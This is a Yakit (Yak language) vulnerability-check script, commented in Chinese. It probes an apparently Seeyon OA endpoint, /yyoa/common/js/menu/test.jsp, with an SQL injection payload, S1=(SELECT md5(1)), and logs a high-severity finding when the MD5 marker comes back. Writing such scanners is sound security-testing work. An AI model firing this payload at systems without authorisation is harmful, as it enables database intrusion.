yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    // 随机生成MD5标记
    flag = codec.Md5("1")

    // 构建第一个GET请求，测试目标服务器是否存在SQL注入漏洞
    packet = `GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT md5(1)) HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept-Encoding: gzip`

    // 发送GET请求
    rsp, req, _ = poc.HTTP(packet,
        poc.params({"target": addr}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    // 检查响应内容是否包含 md5(1) 的结果
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`, flag) {
        yakit.Info("%v found /yyoa/common/js/menu/test.jsp SQL注入漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("/yyoa/common/js/menu/test.jsp SQL注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("/yyoa/common/js/menu/test.jsp SQL注入漏洞"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("no cve"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // 处理匹配结果
    if !result.IsOpen() {
        return
    }

    // 如果目标服务器的端口开放，且存在HTTP流量，则进行漏洞检查
    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
